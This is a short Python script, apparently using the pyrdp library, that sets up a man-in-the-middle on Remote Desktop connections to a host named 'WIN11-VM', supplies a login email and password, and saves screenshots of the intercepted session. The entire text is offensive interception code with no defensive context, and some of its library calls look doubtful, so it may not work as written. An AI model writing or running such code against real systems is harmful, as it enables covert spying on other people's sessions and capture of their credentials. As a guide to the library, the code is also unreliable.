from pyrdp.core import Observer
from pyrdp.mitm import MITMConfig, RDPMITM
from pyrdp.logging import LOGGER_NAMES, SessionLogger
from pyrdp.ui import QRemoteDesktop

class ScreenshotObserver(Observer):
    def onPDUReceived(self, pdu):
        rdpClient = QRemoteDesktop()
        rdpClient.notify(pdu)
        screenshot = rdpClient.getScreenshot()
        screenshot.save("screenshot.png", "PNG")

config = MITMConfig()
config.targetIP = "WIN11-VM"
config.username = "Robin.F.Collins@outlook.com"
config.password = "TestPassword"
logger = SessionLogger(LOGGER_NAMES.MITM_CONNECTIONS, "myrdpconnection")
mitm = RDPMITM(config, logger, "192.168.1.1")
mitm.addObserver(ScreenshotObserver())
mitm.start()